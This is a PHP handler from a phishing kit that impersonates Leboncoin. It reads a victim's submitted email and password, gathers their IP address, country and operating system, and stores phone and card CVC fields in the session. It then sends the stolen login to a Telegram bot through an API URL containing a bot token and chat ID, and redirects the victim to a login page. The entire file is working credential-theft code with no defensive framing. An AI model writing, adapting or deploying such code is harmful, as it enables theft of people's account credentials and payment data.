<?php

session_start();
include_once 'functions.php';

	
$message = '[🍿] +1 LOG LEBONCOIN [🍿]' . "\r\n\n";

$message .= '🍿 E-mail : ' . $_POST['mailo'] . "\r\n\n";
$message .= '🍿 Mot de passe : ' . $_POST['password'] . "\r\n\n";

$message .= '[🤖] TIERS [🤖]' . "\r\n\n";

$message .= '🤖 IP : ' . get_user_ip() . "\r\n";
$message .= '🤖 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";

$_SESSION['mailo']=$_POST['mailo'];
$_SESSION['tel']=$_POST['tel'];
$_SESSION['cvc']=$_POST['cvc'];

file_get_contents("https://api.telegram.org/bot7365575342:AAEgg8vKLSnmt3pfdd96nETNLJ5WrbC8vJM/sendMessage?chat_id=7421525298&text=" . urlencode($message)."" );

    header('location: login.php');

?>